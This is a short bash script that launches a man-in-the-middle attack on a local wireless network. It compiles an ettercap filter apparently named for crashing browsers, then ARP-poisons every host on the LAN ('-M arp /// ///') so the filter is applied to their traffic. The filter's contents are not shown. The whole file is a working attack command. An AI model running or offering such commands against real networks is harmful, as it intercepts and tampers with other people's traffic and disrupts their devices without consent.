#!/bin/bash
etterfilter browsercrash.filter -o browsercrash.ef
sudo ettercap -T -q -i wlp2s0 -F browsercrash.ef -M arp /// ///
/home/eddy/programming/bash/flushdns.sh
